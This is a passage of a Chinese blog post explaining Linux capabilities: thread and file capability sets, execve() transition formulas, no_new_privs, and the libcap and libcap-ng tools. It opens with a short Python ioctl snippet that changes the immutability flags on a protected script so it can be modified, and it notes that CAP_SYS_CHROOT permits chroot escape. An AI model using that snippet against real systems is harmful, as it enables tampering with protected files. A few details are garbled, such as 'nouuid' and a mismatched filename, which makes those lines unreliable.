+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#Check that the file is imutable</span><br><span class="line">lsattr file.sh </span><br><span class="line">----i---------e--- backup.sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#Pyhton code to allow modifications to the file</span><br><span class="line">import fcntl</span><br><span class="line">import os</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">FS_APPEND_FL = 0x00000020</span><br><span class="line">FS_IOC_SETFLAGS = 0x40086602</span><br><span class="line"></span><br><span class="line">fd = os.open(&#x27;/path/to/file.sh&#x27;, os.O_RDONLY)</span><br><span class="line">f = struct.pack(&#x27;i&#x27;, FS_APPEND_FL)</span><br><span class="line">fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)</span><br><span class="line"></span><br><span class="line">f=open(&quot;/path/to/file.sh&quot;,&#x27;a+&#x27;)</span><br><span class="line">f.write(&#x27;New content for the file\n&#x27;)</span><br></pre></td></tr></table></figure>
+<h3 id="cap_sys_chroot"><a class="markdownIt-Anchor" href="#cap_sys_chroot">#</a> CAP_SYS_CHROOT</h3>
+<p>允许使用 chroot (2) 进行系统调用，可以允许 chroot (2) 进行逃逸</p>
+<h2 id="capabilities-的赋予和继承"><a class="markdownIt-Anchor" href="#capabilities-的赋予和继承">#</a> capabilities 的赋予和继承</h2>
+<hr>
+<p>Linux capabilities 分为进程 capabilities 和文件 capabilities。对于进程来说，capabilities 是细分到线程的，即每个线程可以有自己的 capabilities。对于文件来说，capabilities 保存在文件的扩展属性中。</p>
+<h3 id="线程的-capabilities"><a class="markdownIt-Anchor" href="#线程的-capabilities">#</a> 线程的 capabilities</h3>
+<p>每一个线程，具有 5 个 capabilities 集合，每一个集合使用  <code>64</code>  位掩码来表示，显示为  <code>16</code>  进制格式。这 5 个 capabilities 集合分别是：</p>
+<ul>
+<li>Permitted</li>
+<li>Effective</li>
+<li>Inheritable</li>
+<li>Bounding</li>
+<li>Ambient</li>
+</ul>
+<p>每个集合中都包含零个或多个 capabilities。</p>
+<h4 id="permitted-允许"><a class="markdownIt-Anchor" href="#permitted-允许">#</a> Permitted 允许</h4>
+<p>定义了线程能够使用的 capabilities 的上限。线程可以通过系统调用  <code>capset()</code>  来从  <code>Effective</code>  或  <code>Inheritable</code>  集合中添加或删除 capability，前提是添加或删除的 capability 必须包含在  <code>Permitted</code>  集合中。</p>
+<p>如果某个线程想向  <code>Inheritable</code>  集合中添加或删除 capability，首先它的  <code>Effective</code>  集合中得包含  <code>CAP_SETPCAP</code>  这个 capabiliy。</p>
+<h4 id="effective-有效"><a class="markdownIt-Anchor" href="#effective-有效">#</a> Effective 有效</h4>
+<p>内核检查线程是否可以进行特权操作时，检查的对象便是  <code>Effective</code>  集合。如之前所说， <code>Permitted</code>  集合定义了上限，线程可以删除 Effective 集合中的某 capability，随后在需要时，再从 Permitted 集合中恢复该 capability，以此达到临时禁用 capability 的功能。</p>
+<h4 id="inheritable"><a class="markdownIt-Anchor" href="#inheritable">#</a> Inheritable</h4>
+<p>当执行 <code>exec()</code>  系统调用时，能够被新的可执行文件继承的 capabilities，被包含在  <code>Inheritable</code>  集合中。这里需要说明一下，包含在该集合中的 capabilities 并不会自动继承给新的可执行文件，即不会添加到新线程的  <code>Effective</code>  集合中，它只会影响新线程的  <code>Permitted</code>  集合。</p>
+<h4 id="bounding"><a class="markdownIt-Anchor" href="#bounding">#</a> Bounding</h4>
+<p><code>Bounding</code>  集合是  <code>-</code>  集合的超集，如果某个 capability 不在  <code>Bounding</code>  集合中，即使它在  <code>Permitted</code>  集合中，该线程也不能将该 capability 添加到它的  <code>Inheritable</code>  集合中。</p>
+<p>Bounding 集合的 capabilities 在执行  <code>fork()</code>  系统调用时会传递给子进程的 Bounding 集合，并且在执行  <code>execve</code>  系统调用后保持不变。</p>
+<ul>
+<li>当线程运行时，不能向 Bounding 集合中添加 capabilities。</li>
+<li>一旦某个 capability 被从 Bounding 集合中删除，便不能再添加回来。</li>
+<li>将某个 capability 从 Bounding 集合中删除后，如果之前  <code>Inherited</code>  集合包含该 capability，将继续保留。但如果后续从  <code>Inheritable</code>  集合中删除了该 capability，便不能再添加回来。</li>
+</ul>
+<h4 id="ambient"><a class="markdownIt-Anchor" href="#ambient">#</a> Ambient</h4>
+<p>Linux  <code>4.3</code>  内核新增了一个 capabilities 集合叫  <code>Ambient</code>  ，用来弥补  <code>Inheritable</code>  的不足。 <code>Ambient</code>  具有如下特性：</p>
+<ul>
+<li><code>Permitted</code>  和  <code>Inheritable</code>  未设置的 capabilities， <code>Ambient</code>  也不能设置。</li>
+<li>当  <code>Permitted</code>  和  <code>Inheritable</code>  关闭某权限（比如  <code>CAP_SYS_BOOT</code> ）后， <code>Ambient</code>  也随之关闭对应权限。这样就确保了降低权限后子进程也会降低权限。</li>
+<li>非特权用户如果在  <code>Permitted</code>  集合中有一个 capability，那么可以添加到  <code>Ambient</code>  集合中（也有了 A 权限），这样它的子进程便可以在  <code>Ambient</code> 、 <code>Permitted</code>  和  <code>Effective</code>  集合中获取这个 capability。</li>
+</ul>
+<p><code>Ambient</code>  的好处显而易见，举个例子，如果你将  <code>CAP_NET_ADMIN</code>  添加到当前进程的  <code>Ambient</code>  集合中，它便可以通过  <code>fork()</code>  和  <code>execve()</code>  调用 shell 脚本来执行网络管理任务，因为  <code>CAP_NET_ADMIN</code>  会自动继承下去。</p>
+<h3 id="文件的-capabilities"><a class="markdownIt-Anchor" href="#文件的-capabilities">#</a> 文件的 capabilities</h3>
+<p>文件的 capabilities 被保存在文件的扩展属性中。如果想修改这些属性，需要具有  <code>CAP_SETFCAP</code>  的 capability。文件与线程的 capabilities 共同决定了通过  <code>execve()</code>  运行该文件后的线程的 capabilities。</p>
+<p>文件的 capabilities 功能，需要文件系统的支持。如果文件系统使用了  <code>nouuid</code>  选项进行挂载，那么文件的 capabilities 将会被忽略。</p>
+<p>类似于线程的 capabilities，文件的 capabilities 包含了 3 个集合：</p>
+<ul>
+<li>Permitted</li>
+<li>Inheritable</li>
+<li>Effective</li>
+</ul>
+<h4 id="permitted"><a class="markdownIt-Anchor" href="#permitted">#</a> Permitted</h4>
+<p>这个集合中包含的 capabilities，在文件被执行时，会与线程的 Bounding 集合计算交集，然后添加到线程的  <code>Permitted</code>  集合中。</p>
+<h4 id="inheritable-2"><a class="markdownIt-Anchor" href="#inheritable-2">#</a> Inheritable</h4>
+<p>这个集合与线程的  <code>Inheritable</code>  集合的交集，会被添加到执行完  <code>execve()</code>  后的线程的  <code>Permitted</code>  集合中。</p>
+<h4 id="effective"><a class="markdownIt-Anchor" href="#effective">#</a> Effective</h4>
+<p>这不是一个集合，仅仅是一个标志位。如果设置开启，那么在执行完  <code>execve()</code>  后，线程  <code>Permitted</code>  集合中的 capabilities 会自动添加到它的  <code>Effective</code>  集合中</p>
+<h3 id="运行-execve-后-capabilities-的变化"><a class="markdownIt-Anchor" href="#运行-execve-后-capabilities-的变化">#</a> 运行 execve () 后 capabilities 的变化</h3>
+<hr>
+<p>我们用  <code>P</code>  代表执行  <code>execve()</code>  前线程的 capabilities， <code>P'</code>  代表执行  <code>execve()</code>  后线程的 capabilities， <code>F</code>  代表可执行文件的 capabilities。那么：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">P&#x27;(ambient)     = (file is privileged) ? 0 : P(ambient)</span><br><span class="line"></span><br><span class="line">P&#x27;(permitted)   = (P(inheritable) &amp; F(inheritable)) |</span><br><span class="line">                          (F(permitted) &amp; P(bounding)) | P&#x27;(ambient) </span><br><span class="line"></span><br><span class="line">P&#x27;(effective)   = F(effective) ? P&#x27;(permitted) : P&#x27;(ambient)</span><br><span class="line"></span><br><span class="line">P&#x27;(inheritable) = P(inheritable)    [i.e., unchanged]</span><br><span class="line"></span><br><span class="line">P&#x27;(bounding)    = P(bounding)       [i.e., unchanged]</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ul>
+<li>如果用户是 root 用户，那么执行  <code>execve()</code>  后线程的  <code>Ambient</code>  集合是空集；如果是普通用户，那么执行  <code>execve()</code>  后线程的  <code>Ambient</code>  集合将会继承执行  <code>execve()</code>  前线程的  <code>Ambient</code>  集合。</li>
+<li>执行  <code>execve()</code>  前线程的  <code>Inheritable</code>  集合与可执行文件的  <code>Inheritable</code>  集合取交集，会被添加到执行  <code>execve()</code>  后线程的  <code>Permitted</code>  集合；线程执行前 bounding 集合与可执行文件的  <code>Permitted</code>  集合取交集，也会被添加到执行  <code>execve()</code>  后线程的  <code>Permitted</code>  集合；同时执行  <code>execve()</code>  后线程的  <code>Ambient</code>  集合中的 capabilities 会被自动添加到该线程的  <code>Permitted</code>  集合中。</li>
+<li>如果可执行文件开启了 Effective 标志位，那么在执行完  <code>execve()</code>  后，线程  <code>Permitted</code>  集合中的 capabilities 会自动添加到它的  <code>Effective</code>  集合中。</li>
+<li>执行  <code>execve()</code>  前线程的  <code>Inheritable</code>  集合会继承给执行  <code>execve()</code>  后线程的  <code>Inheritable</code>  集合。</li>
+</ul>
+</blockquote>
+<p>下面我们用一个例子来演示上述公式的计算逻辑，以  <code>ping</code>  文件为例。如果我们将  <code>CAP_NET_RAW</code>  capability 添加到 ping 文件的  <code>Permitted</code>  集合中（F (Permitted)），它就会添加到执行后的线程的  <code>Permitted</code>  集合中（P’(Permitted)）。由于 ping 文件具有 <strong>capabilities 感知能力</strong>，即能够调用  <code>capset()</code>  和  <code>capget()</code>  ，它在运行时会调用  <code>capset()</code>  将  <code>CAP_NET_RAW</code>  capability 添加到线程的  <code>Effective</code>  集合中。</p>
+<p>换句话说，如果可执行文件不具有 <strong>capabilities 感知能力</strong>，我们就必须要开启 Effective 标志位（F (Effective)），这样就会将该 capability 自动添加到线程的  <code>Effective</code>  集合中。具有<strong> capabilities 感知能力</strong>的可执行文件更安全，因为它会限制线程使用该 capability 的时间。</p>
+<p>我们也可以将 capabilities 添加到文件的  <code>Inheritable</code>  集合中，文件的  <code>Inheritable</code>  集合会与当前线程的  <code>Inheritable</code>  集合取交集，然后添加到新线程的  <code>Permitted</code>  集合中。这样就可以控制可执行文件的运行环境。</p>
+<p>看起来很有道理，但有一个问题：如果可执行文件的有效用户是普通用户，且没有  <code>Inheritable</code>  集合，即  <code>F(inheritable) = 0</code> ，那么  <code>P(inheritable)</code>  将会被忽略（P (inheritable) &amp; F (inheritable)）。由于绝大多数可执行文件都是这种情况，因此  <code>Inheritable</code>  集合的可用性受到了限制。我们无法让脚本中的线程自动继承该脚本文件中的 capabilities，除非让脚本具有 <strong>capabilities 感知能力</strong>。</p>
+<p>要想改变这种状况，可以使用  <code>Ambient</code>  集合。 <code>Ambient</code>  集合会自动从父线程中继承，同时会自动添加到当前线程的  <code>Permitted</code>  集合中。举个例子，在一个 Bash 环境中（例如某个正在执行的脚本），该环境所在的线程的  <code>Ambient</code>  集合中包含  <code>CAP_NET_RAW</code>  capability，那么在该环境中执行 ping 文件可以正常工作，即使该文件是普通文件（没有任何 capabilities，也没有设置 SUID）。</p>
+<p>(这几条都是由上面的公式推导而来)</p>
+<p>最后拿 docker 举例，如果你使用普通用户来启动官方的 nginx 容器，会出现以下错误：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bind</span>() to 0.0.0.0:80 failed (13: Permission denied)</span><br></pre></td></tr></table></figure>
+<p>因为 nginx 进程的  <code>Effective</code>  集合中不包含  <code>CAP_NET_BIND_SERVICE</code>  capability，且不具有 <strong>capabilities 感知能力</strong>（普通用户），所以启动失败。要想启动成功，至少需要将该 capability 添加到 nginx 文件的  <code>Inheritable</code>  集合中，同时开启 Effective 标志位，并且在 Kubernetes Pod 的部署清单中的 securityContext –&gt; capabilities 字段下面添加  <code>NET_BIND_SERVICE</code> （这个 capability 会被添加到 nginx 进程的  <code>Bounding</code>  集合中），最后还要将 capability 添加到 nginx 文件的  <code>Permitted</code>  集合中。如此一来就大功告成了，参考公式：P’(permitted) = …|(F (permitted) &amp; P (bounding)))|…，P’(effective)  = F (effective) ? P’(permitted) : P’(ambient)。</p>
+<p>如果容器开启了  <code>securityContext/allowPrivilegeEscalation</code> ，上述设置仍然可以生效。如果 nginx 文件具有 <strong>capabilities 感知能力</strong>，那么只需要将  <code>CAP_NET_BIND_SERVICE</code>  capability 添加到它的  <code>Inheritable</code>  集合中就可以正常工作了。</p>
+<h2 id="查看和设置capabilities"><a class="markdownIt-Anchor" href="#查看和设置capabilities">#</a> 查看和设置 capabilities</h2>
+<p>Linux 系统中主要提供了两种工具来管理 capabilities： <code>libcap</code>  和  <code>libcap-ng</code> 。 <code>libcap</code>  提供了  <code>getcap</code>  和  <code>setcap</code>  两个命令来分别查看和设置文件的 capabilities，同时还提供了  <code>capsh</code>  来查看当前 shell 进程的 capabilities。 <code>libcap-ng</code>  更易于使用，使用同一个命令  <code>filecap</code>  来查看和设置 capabilities。</p>
+<h3 id="1-libcap"><a class="markdownIt-Anchor" href="#1-libcap">#</a> 1. libcap</h3>
+<hr>
+<p>安装很简单，以 CentOS 为例，可以通过以下命令安装：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ yum install -y libcap</span><br></pre></td></tr></table></figure>
+<p>如果想查看当前 shell 进程的 capabilities，可以用  <code>capsh</code>  命令。下面是 CentOS 系统中的 root 用户执行  <code>capsh</code>  的输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ capsh --print</span><br><span class="line"></span><br><span class="line">Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep</span><br><span class="line">Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read</span><br><span class="line">Securebits: 00/0x0/1&#x27;b0</span><br><span class="line"> secure-noroot: no (unlocked)</span><br><span class="line"> secure-no-suid-fixup: no (unlocked)</span><br><span class="line"> secure-keep-caps: no (unlocked)</span><br><span class="line">uid=0(root)</span><br><span class="line">gid=0(root)</span><br><span class="line">groups=0(root)</span><br></pre></td></tr></table></figure>
+<p>解释一下：</p>
+<ul>
+<li><strong>Current</strong> : 表示当前 shell 进程的 Effective capabilities 和 Permitted capabilities。可以包含多个分组，每一个分组的表示形式为  <code>capability[,capability…]+(e|i|p)</code> ，其中  <code>e</code>  表示 effective， <code>i</code>  表示 inheritable， <code>p</code>  表示 permitted。不同的分组之间通过空格隔开，例如： <code>Current: = cap_sys_chroot+ep cap_net_bind_service+eip</code> 。再举一个例子， <code>cap_net_bind_service+e cap_net_bind_service+ip</code>  和  <code>cap_net_bind_service+eip</code>  等价。</li>
+<li><strong>Bounding set</strong> : 这里仅仅表示 Bounding 集合中的 capabilities，不包括其他集合，所以分组的末尾不用加上  <code>+...</code>  。</li>
+</ul>
+<p>这个命令输出的信息比较有限，完整的信息可以查看 /proc 文件系统，比如当前 shell 进程就可以查看  <code>/proc/$$/status</code> 。其中一个重要的状态就是  <code>NoNewPrivs</code> ，可以通过以下命令查看：</p>
+<p><code>grep NoNewPrivs /proc/$$/status</code></p>
+<p>自从 Linux 4.10 开始， <code>/proc/[pid]/status</code>  中的  <code>NoNewPrivs</code>  值表示了线程的  <code>no_new_privs</code>  属性。</p>
+<h3 id="no_new_privs"><a class="markdownIt-Anchor" href="#no_new_privs">#</a> no_new_privs</h3>
+<p>一般情况下， <code>execve()</code>  系统调用能够赋予新启动的进程其父进程没有的权限，最常见的例子就是通过  <code>setuid</code>  和  <code>setgid</code>  来设置程序进程的 uid 和 gid 以及文件的访问权限。这就给不怀好意者钻了不少空子，可以直接通过 fork 来提升进程的权限，从而达到不可告人的目的。</p>
+<p>为了解决这个问题，Linux 内核从 3.5 版本开始，引入了  <code>no_new_privs</code>  属性（实际上就是一个 bit，可以开启和关闭），提供给进程一种能够在  <code>execve()</code>  调用整个阶段都能持续有效且安全的方法。</p>
+<ul>
+<li>开启了  <code>no_new_privs</code>  之后，execve 函数可以确保所有操作都必须调用  <code>execve()</code>  判断并赋予权限后才能被执行。这就确保了线程及子线程都无法获得额外的权限，因为无法执行 setuid 和 setgid，也不能设置文件的权限。</li>
+<li>一旦当前线程的  <code>no_new_privs</code>  被置位后，不论通过 fork，clone 或 execve 生成的子线程都无法将该位清零。</li>
+</ul>
+<h3 id="管理-capabilities"><a class="markdownIt-Anchor" href="#管理-capabilities">#</a> 管理 capabilities</h3>
+<p>可以通过  <code>getcap</code>  来查看文件的 capabilities，例如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">getcap</span> /bin/ping /usr/sbin/arping</span><br><span class="line"></span><br><span class="line">/bin/ping = cap_net_admin,cap_net_raw+p</span><br><span class="line">/usr/sbin/arping = cap_net_raw+p</span><br></pre></td></tr></table></figure>
+<p>也可以使用  <code>-r</code>  参数来递归查询：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">getcap</span> -r /usr 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/ping = cap_net_admin,cap_net_raw+p</span><br><span class="line">/usr/bin/newgidmap = cap_setgid+ep</span><br><span class="line">/usr/bin/newuidmap = cap_setuid+ep</span><br><span class="line">/usr/sbin/arping = cap_net_raw+p</span><br><span class="line">/usr/sbin/clockdiff = cap_net_raw+p</span><br></pre></td></tr></table></figure>
+<p>如果想查看某个进程的 capabilities，可以直接使用  <code>getpcaps</code> ，后面跟上进程的 PID：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ getpcaps 1234</span><br></pre></td></tr></table></figure>
+<p>如果想查看一组相互关联的线程的 capabilities（比如 nginx），可以这么来看：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ getpcaps $(pgrep nginx)</span><br></pre></td></tr></table></figure>
+<p>这里你会看到只有主线程才有 capabilities，子线程和其他 workers 都没有 capabilities，这是因为只有 master 才需要特殊权限，例如监听网络端口，其他线程只需要响应请求就好了。</p>
+<p>设置文件的 capabilities 可以使用  <code>setcap</code> ，语法如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">setcap</span> CAP+<span class="built_in">set</span> filename</span><br></pre></td></tr></table></figure>
+<p>例如，将  <code>CAP_CHOWN</code>  和  <code>CAP_DAC_OVERRIDE</code>  capabilities 添加到  <code>permitted</code>  和  <code>effective</code>  集合：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">setcap</span> CAP_CHOWN,CAP_DAC_OVERRIDE+ep file1</span><br></pre></td></tr></table></figure>
+<p>如果想移除某个文件的 capabilities，可以使用  <code>-r</code>  参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">setcap</span> -r filename</span><br></pre></td></tr></table></figure>
+<h3 id="2-libcap-ng"><a class="markdownIt-Anchor" href="#2-libcap-ng">#</a> 2. libcap-ng</h3>
+<p>安装也很简单，以 CentOS 为例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ yum install libcap-ng-utils</span><br></pre></td></tr></table></figure>
+<h3 id="用法"><a class="markdownIt-Anchor" href="#用法">#</a> 用法</h3>
+<p>libcap-ng 使用  <code>filecap</code>  命令来管理文件的 capabilities。有几个需要注意的地方：</p>
+<ul>
+<li>filecap 添加删除或查看 capabilities 时，capabilities 的名字不需要带  <code>CAP_</code>  前缀（例如，使用  <code>NET_ADMIN</code>  代替  <code>CAP_NET_ADMIN</code> ）；</li>
+<li>filecap 不支持相对路径，只支持绝对路径；</li>
+<li>filecap 不允许指定 capabilities 作用的集合，capabilities 只会被添加到  <code>permitted</code>  和  <code>effective</code>  集合。</li>
+</ul>
+<p>查看文件的 capabilities：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ filecap /full/path/to/file</span><br></pre></td></tr></table></figure>
+<p>递归查看某个目录下所有文件的 capabilities：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ filecap /full/path/to/dir</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ filecap /usr/bin</span><br><span class="line"></span><br><span class="line">file                 capabilities</span><br><span class="line">/usr/bin/newgidmap     setgid</span><br><span class="line">/usr/bin/newuidmap     setuid</span><br></pre></td></tr></table></figure>
+<p>递归查看整个系统所有文件的 capabilities：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ filecap /</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ filecap -a</span><br></pre></td></tr></table></figure>
+<p>设置文件的 capabilities 语法如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ filecap /full/path/to/file cap_name</span><br></pre></td></tr></table></figure>
+<p>移除某个文件的 capabilities：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ filecap /full/path/to/file none</span><br></pre></td></tr></table></figure>
+<h2 id="capability-进阶"><a class="markdownIt-Anchor" href="#capability-进阶">#</a> capability 进阶</h2>
+<p>在  <code>Ubuntu 18.04</code>  上，以普通用户的身份运行  <code>capsh</code>  将会得到如下结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ capsh --<span class="built_in">print</span></span><br><span class="line">Current: =</span><br><span class="line">Bounding <span class="built_in">set</span> =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read</span><br><span class="line">Securebits: 00/0x0/1<span class="string">&#x27;b0</span></span><br><span class="line"><span class="string"> secure-noroot: no (unlocked)</span></span><br><span class="line"><span class="string"> secure-no-suid-fixup: no (unlocked)</span></span><br><span class="line"><span class="string"> secure-keep-caps: no (unlocked)</span></span><br><span class="line"><span class="string">uid=1000(fox)</span></span><br><span class="line"><span class="string">gid=1000(fox)</span></span><br><span class="line"><span class="string">groups=4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),114(docker),1000(fox)</span></span><br></pre></td></tr></table></figure>
+<p>可以看到普通用户当前所在的 shell 进程没有任何 capabilities（即  <code>Effective</code>  集合为空）， <code>Bounding</code>  集合包含了所有 capabilities。</p>
+<p>这个命令输出的信息比较有限，完整的信息可以查看 /proc 文件系统，比如当前 shell 进程就可以查看  <code>/proc/$$/status</code> 。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ grep Cap /proc/$$/status</span><br><span class="line">CapInh:	0000000000000000</span><br><span class="line">CapPrm:	0000000000000000</span><br><span class="line">CapEff:	0000000000000000</span><br><span class="line">CapBnd:	0000003fffffffff</span><br><span class="line">CapAmb:	0000000000000000</span><br></pre></td></tr></table></figure>
+<p>输出中的  <code>16</code>  进制掩码表示对应集合中的 capabilities，可以使用  <code>capsh</code>  对其进行解码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ capsh --decode=0000003fffffffff</span><br><span class="line">0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read</span><br></pre></td></tr></table></figure>
+<p>和  <code>capsh --print</code>  命令输出的结果一样。</p>
+<p>如果是 root 用户，得到的结果和普通用户是不一样的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ grep Cap /proc/$$/status</span><br><span class="line">CapInh:	0000000000000000</span><br><span class="line">CapPrm:	0000003fffffffff</span><br><span class="line">CapEff:	0000003fffffffff</span><br><span class="line">CapBnd:	0000003fffffffff</span><br><span class="line">CapAmb:	0000000000000000</span><br></pre></td></tr></table></figure>
+<p>所有的 capabilities 都包含在了  <code>Permitted</code> 、 <code>Effective</code>  和  <code>Bounding</code>  集合中，所以 root 用户可以执行任何内核调用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在Ubuntu中Bnd是3fffffffff</span><br><span class="line">在centos中Bnd是1fffffffff</span><br></pre></td></tr></table></figure>
+<h3 id="手动设置capability"><a class="markdownIt-Anchor" href="#手动设置capability">#</a> 手动设置 capability</h3>
